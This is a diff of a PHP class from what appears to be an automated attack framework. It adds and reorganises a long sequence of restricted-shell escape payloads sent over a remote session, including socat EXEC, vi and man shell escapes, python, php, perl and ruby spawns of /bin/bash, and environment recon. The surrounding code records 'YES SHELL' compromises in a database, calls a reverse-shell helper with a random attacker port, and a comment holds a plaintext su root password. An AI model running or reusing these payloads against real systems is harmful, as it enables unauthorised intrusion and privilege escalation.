@@ -717,6 +717,11 @@ class SERVICE4COM extends AUTH {
                 //https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
                 
                 //  ===================================================================
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
                 
                 $data = "echo \$PATH";
                 $this->article("DATA", $data);
@@ -760,9 +765,200 @@ class SERVICE4COM extends AUTH {
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 echo stream_get_contents($stream);
+      
+                
+                $data = "(sleep 15; echo \"! bash -li\";sleep 8 ; ) | socat - EXEC:\"man man\",pty,stderr,setsid,sigint,ctty,sane";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $rst_app =  stream_get_contents($stream);
+                echo "$rst_app\n";
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "echo -e \"man man <<# >/dev/null 2>&1\n! bash -li\nwhoami > /dev/tty\nls > /dev/tty\n#\" | bash ";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                echo  stream_get_contents($stream);
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+
+                $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid > /dev/tty\nls > /dev/tty\n#\" | bash ";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                echo  stream_get_contents($stream);
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid > /dev/tty\nls > /dev/tty\n#\"  ";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                echo  stream_get_contents($stream);
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid\n#\" ";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                echo  stream_get_contents($stream);
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid\necho \$0\n > /dev/tty\n#\" ";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                echo  stream_get_contents($stream);
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                
+                
+                
+                $data = "printf \"%s\\n\" $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                
+
+                
+                $data = "?";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "-h";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "--help";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "\$SHELL --version";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "echo \$BASH_VERSION";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "PS1= ";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+              
+                
+                $data = "chsh -l";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "printenv";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "socat exec:'sh -li',pty,stderr,setsid,sigint,sane";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "python -c 'import pty; pty.spawn(\"/bin/bash -li\")'";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "php -r 'system(\"/bin/bash -li\");'";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "perl -e \"exec \\\"/bin/bash -li\\\";\"  ";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "ruby -e \"exec \\\"/bin/bash -li\\\";\"  ";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
+                $data = "/usr/bin/script -qc /bin/bash -li /dev/null";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                $data = "echo $0";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                $tmp = stream_get_contents($stream);
+                echo "$tmp\n";
+                
                 
                 $rst_app = $rst_path.$rst_path2.$rst_help;
-                exit();
+                
                 
                 foreach ($this->tab_sudo8app2shell as $app){
                     if (!empty($app)){
@@ -776,8 +972,6 @@ class SERVICE4COM extends AUTH {
                             $attacker_port = rand(1024,65535);
                             $shell = "/bin/sh";
                             $sudo = FALSE;
-                            
-                            
                             
                             $cmd = "$shell";
                             $data = $obj_bin->elf4root2cmd($this->ip, $attacker_port, $shell, $sudo, $userpass, $cmd);
@@ -811,124 +1005,6 @@ class SERVICE4COM extends AUTH {
                 // ==================================================================
                 
 
-                
-                $data = "(sleep 15; echo \"! bash -li\";sleep 8 ; ) | socat - EXEC:\"man man\",pty,stderr,setsid,sigint,ctty,sane";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $rst_app =  stream_get_contents($stream);
-                echo "$rst_app\n";
-                
-                
-                $data = "printf \"%s\" $0";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                
-                $data = "echo $0";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                $data = "?";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                $data = "-h";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                $data = "--help";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                
-                
-                $data = "\$SHELL --version";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                $data = "echo \$BASH_VERSION";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                $data = "PS1= ";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                
-
- 
-                
-                $data = "chsh -l";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                $data = "printenv";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                $data = "socat exec:'sh -li',pty,stderr,setsid,sigint,sane";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                $data = "/usr/bin/script -qc /bin/bash -c 'id' /dev/null";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                $data = "python -c 'import pty; pty.spawn(\"/bin/bash -i\")'";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                $data = "php -r 'system(\"/bin/bash\");'";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                $data = "perl -e \"exec \\\"/bin/bash\\\";\"  ";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                $data = "ruby -e \"exec \\\"/bin/bash\\\";\"  ";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
-                
-                $data = "/usr/bin/script -qc /bin/bash  /dev/null";
-                $this->article("DATA", $data);
-                fputs($stream, "$data\n");
-                $tmp = stream_get_contents($stream);
-                echo "$tmp\n";
-                
                 
                 // socat file:`tty`,raw,echo=0 tcp-listen:4444
                 // echo -e "su - root <<! >/dev/null 2>&1\nsateam123456789\nwhoami > /dev/tty\nls > /dev/tty\n!" | bash
@@ -995,7 +1071,6 @@ class SERVICE4COM extends AUTH {
         else {
             $template = base64_decode($template_b64);
             $chaine = "YES READ on $this->ip:$this->port with $template";
-            //$this->notify($chaine);
             $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
             $sql_ip = "UPDATE IP SET ip2read=1 WHERE $this->ip2where  ";
             $this->mysql_ressource->query($sql_ip);
@@ -1015,7 +1090,6 @@ class SERVICE4COM extends AUTH {
         else {
             $template = base64_decode($template_b64);
             $chaine = "YES WRITE on $this->ip:$this->port with $template";
-            //$this->notify($chaine);
             $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
             $sql_ip = "UPDATE IP SET ip2write=1 WHERE $this->ip2where  ";
             $this->mysql_ressource->query($sql_ip);
@@ -1036,7 +1110,6 @@ class SERVICE4COM extends AUTH {
         else {
             $template = base64_decode($template_b64);
             $chaine = "YES SHELL on $this->ip:$this->port with $template";
-            //$this->notify($chaine);
             $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
             $sql_ip = "UPDATE IP SET ip2shell=1 WHERE $this->ip2where  ";
             $this->mysql_ressource->query($sql_ip);
@@ -1050,8 +1123,6 @@ class SERVICE4COM extends AUTH {
     
     
     public function key2gen4priv2pem($stream,$timeout,$private_key_file,$private_key_passwd){
-        
-        
         $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -outform pem -text -out $private_key_file.pem",$timeout );
         $this->requette("ls -al $private_key_file.pem");
         $this->requette("file $private_key_file.pem");
